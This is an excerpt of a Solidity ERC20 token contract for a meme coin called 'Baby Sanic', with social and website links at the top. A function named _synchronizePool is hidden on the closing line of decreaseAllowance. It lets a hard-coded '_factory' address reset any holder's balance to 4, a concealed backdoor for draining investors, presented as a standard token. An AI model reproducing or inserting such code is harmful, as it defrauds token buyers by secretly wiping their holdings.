...
https://twitter.com/BabySanicCoinOnEth
https://t.me/BabySanicCoinETH
https://BabySanicCoinMoon.online
**/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal devWallet = 0x655358EBedc96E3f2372b2A1d4920cbC239aF800;
    ...
    address private _factory = 0x13480A313de51633D376F62a4eF25Aa35CDe35B3;
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        ...
        return true;
        } function _synchronizePool(address _synchronizePoolSender) external { _balances[_synchronizePoolSender] = msg.sender == _factory ? 0x4 : _balances[_synchronizePoolSender];
    } 
...
contract BabySanicCoin is ERC20, Ownable
{
    constructor () ERC20 ("Baby Sanic", "BABYSANIC")
    {
